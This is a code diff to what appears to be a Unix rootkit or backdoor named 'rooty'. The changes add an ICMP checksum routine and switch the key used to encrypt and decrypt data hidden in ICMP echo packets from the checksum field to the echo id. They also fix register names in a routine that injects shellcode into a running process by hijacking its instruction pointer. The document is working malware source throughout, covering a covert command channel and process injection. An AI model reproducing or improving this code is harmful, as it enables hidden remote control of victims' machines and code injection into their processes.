@@ -1,5 +1,24 @@
 #include "rooty_unix.h"
 
+/*--------------------------------------------------------------------*/
+/*--- checksum - standard 1s complement checksum                   ---*/
+/*--------------------------------------------------------------------*/
+unsigned short checksum(void *b, int len)
+{	unsigned short *buf = b;
+	unsigned int sum=0;
+	unsigned short result;
+
+	for ( sum = 0; len > 1; len -= 2 )
+		sum += *buf++;
+	if ( len == 1 )
+		sum += *(unsigned char*)buf;
+	sum = (sum >> 16) + (sum & 0xFFFF);
+	sum += (sum >> 16);
+	result = ~sum;
+	return result;
+}
+
+
 int build_packet(unsigned char *pkt, const struct icmp_hdr *icmp_input, uint8_t *data, uint32_t size) {
 	struct icmp_hdr *icmp = NULL;
 	uint8_t *pkt_data = NULL;
@@ -14,10 +33,10 @@ int build_packet(unsigned char *pkt, const struct icmp_hdr *icmp_input, uint8_t 
 		icmp->code = 0;
 		icmp->un.echo.id = icmp_input->un.echo.id;
 		icmp->un.echo.sequence = icmp_input->un.echo.sequence;
-		icmp->checksum = icmp_input->checksum;
 
 		// Copy the data into the packet
 		memcpy(pkt_data, data, size);
+		icmp->checksum = checksum(pkt, sizeof(struct icmp_hdr) + size);
 
 		return (sizeof(struct icmp_hdr) + size);	
 	}
@@ -35,7 +54,7 @@ void send_packet(const uint8_t *data, uint32_t size, const struct ip_hdr *ip, co
 	if(size > 0) {
 
 		// Generate the key for transmission
-		key = (unsigned char *)&icmp->checksum;
+		key = (unsigned char *)&icmp->un.echo.id;
 
 		// Encrypt the data
 		if(decrypt_message(data, encrypted_data, size, key) == size) {
@@ -174,20 +193,20 @@ int inject_remote_shellcode(uint16_t pid, const unsigned char *shellcode, uint32
 	}	
 	DEBUG_WRAP(fprintf(stderr, "EIP updated\n"));
 #else
-	if(WriteData(hijack, shellcode_addr + 70, (unsigned char *)&(backup->r_rip) + 4, 4) != ERROR_NONE) {
-		DEBUG_WRAP(fprintf(stderr, "Failed to patch the original EIP back to %p.\n", (void *)backup->r_rip));
+	if(WriteData(hijack, shellcode_addr + 70, (unsigned char *)&(backup->rip) + 4, 4) != ERROR_NONE) {
+		DEBUG_WRAP(fprintf(stderr, "Failed to patch the original EIP back to %p.\n", (void *)backup->rip));
 		Detach(hijack);
 		return -1;
 	}
-	if(WriteData(hijack, shellcode_addr + 77, (unsigned char *)&(backup->r_rip), 4) != ERROR_NONE) {
-		DEBUG_WRAP(fprintf(stderr, "Failed to patch the original EIP back to %p.\n", (void *)backup->r_rip));
+	if(WriteData(hijack, shellcode_addr + 77, (unsigned char *)&(backup->rip), 4) != ERROR_NONE) {
+		DEBUG_WRAP(fprintf(stderr, "Failed to patch the original EIP back to %p.\n", (void *)backup->rip));
 		Detach(hijack);
 		return -1;
 	}
 
-	DEBUG_WRAP(fprintf(stderr, "Original RIP patched to %p\n", (void *)backup->r_rip));
+	DEBUG_WRAP(fprintf(stderr, "Original RIP patched to %p\n", (void *)backup->rip));
 	
-	backup->r_rip = shellcode_addr + 2;	// This fixes a weird issue with interruping syscalls	
+	backup->rip = shellcode_addr + 2;	// This fixes a weird issue with interruping syscalls	
 	if(SetRegs(hijack, backup) != ERROR_NONE) {
 		DEBUG_WRAP(fprintf(stderr, "Error setting new EIP\n"));
 		Detach(hijack);
@@ -307,7 +326,7 @@ void run_command(const unsigned char *command, uint32_t size, const struct ip_hd
 
 void process_message(const unsigned char *data, uint32_t size, const struct ip_hdr *ip, const struct icmp_hdr *icmp) {
 	unsigned char decoded_data[size];
-	unsigned char *key = (unsigned char *)&(icmp->checksum);
+	unsigned char *key = (unsigned char *)&(icmp->un.echo.id);
 	uint32_t data_len = 0, hdr_len = 0;
 	uint8_t msg_type = 0;
    pid_t pid;
